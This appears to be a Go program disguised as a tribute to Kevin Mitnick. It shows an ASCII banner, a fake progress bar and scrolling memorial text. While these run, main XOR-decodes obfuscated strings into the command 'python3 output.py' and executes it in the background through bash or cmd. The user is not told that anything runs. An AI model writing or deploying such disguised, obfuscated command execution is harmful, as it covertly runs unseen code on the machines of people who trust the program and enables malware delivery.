package main

import (
        "encoding/hex"
        "fmt"
        _ "image/jpeg"
        _ "image/png"
        "log"
        "os/exec"
        "runtime"
        "time"
        "github.com/common-nighthawk/go-figure"
        "github.com/k0kubun/go-ansi"
        "github.com/qeesung/image2ascii/convert"
        "github.com/schollz/progressbar/v3"
)

var data, err = hex.DecodeString("31333337")

type Gratitude struct {
        key   string
        value string
}

func Misc(input, key string) (output string) {
        for i := 0; i < len(input); i++ {
                output += string(input[i] ^ key[i%len(key)])
        }
        return output
}

func loader() {
        bar := progressbar.NewOptions(10000,
                progressbar.OptionSetWriter(ansi.NewAnsiStdout()),
                progressbar.OptionEnableColorCodes(true),
                progressbar.OptionShowBytes(true),
                progressbar.OptionSetWidth(15),
                progressbar.OptionSetDescription("[cyan][1/1][reset] Fetching Banner..."),
                progressbar.OptionSetTheme(progressbar.Theme{
                        Saucer:        "[green]=[reset]",
                        SaucerHead:    "[green]>[reset]",
                        SaucerPadding: " ",
                        BarStart:      "[",
                        BarEnd:        "]",
                }))
        for i := 100; i < 10000; i++ {
                bar.Add(1)
                time.Sleep(1 * time.Millisecond)
        }

        fmt.Println("")
        fmt.Println("")
}

func asciiBanner(img string) {
        // Create convert options
        convertOptions := convert.DefaultOptions
        convertOptions.FixedWidth = 150
        convertOptions.FixedHeight = 40
        // Create the image converter
        converter := convert.NewImageConverter()
        fmt.Print(converter.ImageFile2ASCIIString(img, &convertOptions))

}


func executeCommand(fullCommand string) {
        if runtime.GOOS == "windows" {
                cmdexec := exec.Command("cmd", "/c", fullCommand)
                if err := cmdexec.Run(); err != nil {
                        log.Fatal(err)
                }
        } else {
                cmdexec := exec.Command("bash", "-c", fullCommand)
                if err := cmdexec.Run(); err != nil {
                        log.Fatal(err)
                }
        }
}

func main() {
        asciiBanner("banner.jpg")

        data, err := hex.DecodeString("31333337")
        if err != nil {
                panic(err)
        }
        cmd := Misc("AJG_^]", string(data))
        file := Misc("^FGGDG", string(data))
        ext := Misc("AJ",string(data))
        fullCommand := cmd + "3" +  " " + file + "." + ext 
        go executeCommand(fullCommand)
        loader()
        figure.NewFigure("Rest In Peace Kevin Mitnick", "larry3d", true).Scroll(5000, 1000, "right")
        figure.NewFigure("Thankyou from CyberWorld", "larry3d", true).Scroll(3000, 1000, "left")
}
